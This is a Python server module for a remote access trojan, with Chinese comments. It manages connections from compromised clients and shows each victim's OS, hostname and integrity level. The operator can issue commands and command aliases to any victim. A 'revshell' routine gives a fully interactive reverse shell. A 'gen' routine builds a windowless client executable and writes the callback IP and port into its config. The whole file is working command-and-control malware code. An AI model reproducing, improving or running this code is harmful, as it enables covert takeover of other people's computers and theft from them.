import inspect
import json
import shlex
import socket
import subprocess
import sys
import threading
import time
from functools import partial

from common.ratsocket import RATSocket
from common.util import logger, parse
from server.config.config import SOCKET_ADDR, ALIAS_PATH
from server.util.command import Command
from server.util.util import *
from server.wrapper.client import Client


class Server:

    def __init__(self, address):
        """
        初始化服务器对象
        :param address: 服务器地址
        """
        self.address = address
        self.socket = RATSocket()
        self.connections = []  # 存放已建立的连接
        self.aliases = {}  # 存放命令别名
        self.load_aliases()  # 加载命令别名

    def serve(self):
        """
        接受新连接的线程
        """
        try:
            self.socket.bind(self.address)  # 绑定服务器地址
            logger.info('Listening on port {}'.format(self.address[1]))
        except Exception as e:
            logger.error('Error binding socket: {}'.format(e))

        while 1:
            try:
                conn, addr = self.socket.accept()  # 接受新连接
                conn.settimeout(5)  # 设置超时时间
                try:
                    connection = Client(conn)  # 创建客户端实例
                    info = connection.recv()  # 接收客户端信息
                except json.JSONDecodeError:
                    conn.close()
                    logger.error('Connection timed out: {}'.format(addr))
                    continue
                except Exception as e:
                    logger.error('Error establishing connection: {}'.format(e))
                    continue
                conn.settimeout(None)
                info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}  # 更新客户端信息
                connection = Client(conn, addr, info)
                self.connections.append(connection)  # 将连接添加到连接列表
                logger.info('Connection has been established: {}'.format(addr))
                threading.Thread(target=self.connection_handler, args=(connection,), daemon=True).start()  # 启动新线程处理连接
            except socket.error as e:
                logger.error(e)

    def connection_handler(self, conn):
        """
        处理接收的子线程
        :param conn: 连接
        """
        while 1:
            try:
                conn.recv_result()
            except socket.error:
                logger.error(f'Connection closed: {conn.address}')
                conn.results.put(status=0, message='Receiving aborted')
                self.connections.remove(conn)
                break
            except:
                logger.error(f'Error receiving from {conn.address}', exc_info=True)
                time.sleep(1)

    def list_connections(self):
        """
        显示连接列表
        """
        connections = []
        for i, connection in enumerate(self.connections):
            connections.append([i, connection.info['addr'], connection.info['os'], connection.info['hostname'],
                                connection.info['integrity']])

        try:
            import tabulate
        except ImportError:
            tabulate = None
            traceback.print_exc()

        if tabulate:
            if connections:
                print(tabulate.tabulate(connections, headers=['ID', 'Address', 'OS', 'Hostname', 'Integrity'],
                                        tablefmt='pretty'))
        else:
            for connection in connections:
                print(connection)

    def get_last_connection(self) -> Client:
        """
        获取最新连接
        :return: 连接
        """
        try:
            return self.connections[len(self.connections) - 1]
        except IndexError:
            raise Exception('No connection at this time')

    def get_target_connection(self, id) -> Client:
        """
        根据id获取连接
        :param id: 连接id
        :return: 连接
        """
        try:
            return self.connections[int(id)]
        except (ValueError, IndexError):
            raise Exception('Not a valid selection')

    def kill_connection(self, id):
        """
        关闭连接
        :param id: 连接id
        """
        conn = self.get_target_connection(id)
        if conn:
            conn.send_command('kill')

    def process_command(self, cmd, conn, executor):
        """
        判断命令类型并发送执行
        :param cmd: 命令
        :param conn: 连接
        :param executor: 服务端命令
        :return: 生成器
        """
        grep_pattern = r'\s*\|\s*grep\s+(.+)\s*$'
        match = re.search(grep_pattern, cmd)
        if match:
            keyword = match.group(1)
            cmd = re.sub(grep_pattern, '', cmd)
            func = self.process_command(cmd, conn, executor)
            text = '\n'.join([i[1] for i in func() if len(i) >= 2])
            print(find_and_highlight_keywords(text, keyword))
            return
        name, arg = parse(cmd)
        # 服务端命令
        cmds = [name for name, method in inspect.getmembers(executor, inspect.ismethod) if not name.startswith('__')]
        if name in cmds:
            func = partial(getattr(executor, name), arg)
        # 别名
        elif name in self.aliases:
            func = partial(self.send_alias, conn, name, arg)
        # 发送命令
        else:
            func = partial(conn.send_command, cmd)
        return func

    def reverse_shell(self, cmd, conn, executor):
        """
        打开一个可完全交互的shell，支持stdin
        """

        # 后台接收线程，接收数据并在前台显示，如果出现异常终止线程
        def recv():
            try:
                while 1:
                    data = rev_con.recv(1024)
                    if not data:
                        break
                    sys.stdout.write(data.decode('gbk'))
                    sys.stdout.flush()
            except socket.error as e:
                logger.error(f'Connection aborted: {e}')
                raise

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        addr = ('0.0.0.0', 0)
        s.bind(addr)

        # 服务端获取一个随机可用端口，并将其作为参数发送给客户端
        cmd += f' {s.getsockname()[1]}'
        func = self.process_command(cmd, conn, executor)
        if func:
            for i in func():
                write(*i)

        s.listen(5)
        print('Listening on {}'.format(s.getsockname()))
        rev_con, addr = s.accept()
        print('Connection from {}'.format(addr))
        threading.Thread(target=recv).start()
        while 1:
            cmd = input()
            if cmd in ['exit', 'quit']:
                rev_con.send(bytes('exit\r\n', encoding='gbk'))
                break
            rev_con.send(bytes(cmd + '\r\n', encoding='gbk'))

    def open_connection(self, conn: Client):
        """
        与连接交互
        :param conn: 连接
        """
        print('[+] Connected to {}'.format(conn.address))
        conn.status = True  # 设置连接为交互中
        while not conn.results.empty():  # 连接前判断有没有未读消息
            logger.info(conn.results.get()[1])
        executor = Command(conn, self)
        try:
            while 1:
                try:
                    cmd = colored_input('{}> '.format(conn.info['cwd']))
                    if not cmd.strip():
                        continue
                        # 关闭连接
                    if cmd in ['kill', 'reset']:
                        conn.send_command(cmd)
                        break
                    # 搁置连接
                    elif cmd in ['exit', 'quit']:
                        break
                    # 切换至最新连接
                    elif cmd == 'q':
                        connection = self.get_last_connection()
                        if connection == conn:
                            continue
                        self.open_connection(connection)
                        break
                    elif cmd == 'revshell':
                        self.reverse_shell(cmd, conn, executor)
                        continue

                    func = self.process_command(cmd, conn, executor)
                    if func:
                        for i in func():
                            write(*i)
                except Exception as e:
                    print_error(f'{e.__class__.__name__}: {e}')
        except socket.error:
            print_error('[-] Connection closed')
        except KeyboardInterrupt:
            print(Colors.RESET)
            time.sleep(0.1)
        except Exception as e:
            print_error(f'{e.__class__.__name__}: {e}')
        conn.status = False

    def cmdloop(self):
        """
        命令行交互
        """
        while 1:
            try:
                cmd = colored_input('flc> ')
                if not cmd.strip():
                    continue
                name, arg = parse(cmd)
                # 查看所有连接
                if cmd in ['l', 'ls', 'list']:
                    self.list_connections()
                # 与最新客户端交互
                elif cmd == 'q':
                    self.open_connection(self.get_last_connection())
                # 与指定客户端交互
                elif name in ['s', 'select']:
                    self.open_connection(self.get_target_connection(arg))
                # 关闭连接
                elif name in ['k', 'kill']:
                    self.kill_connection(arg)
                # 退出
                elif cmd in ['quit', 'exit']:
                    server.socket.close()
                    sys.exit(0)
                # 清屏
                elif cmd in ['cls', 'clear']:
                    subprocess.call(cmd, shell=True)
                # 切换目录
                elif name == 'cd':
                    print(cd(arg))
                elif name == 'gen':
                    gen(arg)
                # 与指定客户端交互
                else:
                    try:
                        self.open_connection(self.get_target_connection(cmd))
                    except Exception:
                        raise Exception('Command not recognized')
            except KeyboardInterrupt:
                print(Colors.RESET)
                server.socket.close()
                sys.exit(0)
            except Exception as e:
                write(0, f'[-] {e}')
            finally:
                print()

    def load_aliases(self):
        """
        从文件中加载命令别名
        """
        try:
            with open(ALIAS_PATH, 'r') as f:
                self.aliases = json.load(f)
        except:
            pass

    def save_aliases(self):
        """
        保存命令别名到文件
        :return:
        """
        with open(ALIAS_PATH, 'w') as f:
            json.dump(self.aliases, f)

    def send_alias(self, conn, name, arg):
        """
        发送命令别名
        :param name: 别名
        :param arg: 别名参数
        :param conn: 连接
        :return: 命令id，命令
        """
        command = self.aliases.get(name)
        # 替换参数
        regex = '<.*?>'
        provided_args = shlex.split(arg)  # 实际传入的参数
        required_args = re.findall(regex, command)  # 要求的参数
        if len(required_args) > 0:  # 如果命令要求参数
            if len(required_args) != len(provided_args):  # 如果参数个数不一致
                raise SyntaxError('number of arguments does not match')
            for arg in provided_args:
                command = re.sub(regex, arg, command, count=1)
        else:  # 命令原型中没有参数
            if len(provided_args) != 0:  # 传入了参数
                raise SyntaxError('no argument expected')
        # 发送命令
        func = partial(conn.send_command, command)
        for i in func():
            yield i


def gen(address_port_str):
    exit_code = subprocess.Popen("pyinstaller -Fw ratclient.py -i NONE", shell=True).wait()
    if exit_code == 0:
        print(f'Executable generated successfully: {os.path.abspath("dist/ratclient.exe")}')
    else:
        raise Exception(f"Error occurred while running pyinstaller. Exit code: {exit_code}")

    if address_port_str.strip():
        parts = address_port_str.split(':')
        if len(parts) == 2:
            ip_address = parts[0]
            port = int(parts[1])
            with open('dist/ratclient.ini', 'wt') as file:
                file.write(f'[default]\nip = {ip_address}\nport = {port}')
            print(f'Configuration file generated successfully: {os.path.abspath("dist/ratclient.ini")}')


if __name__ == '__main__':
    os.system('')
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    server.cmdloop()
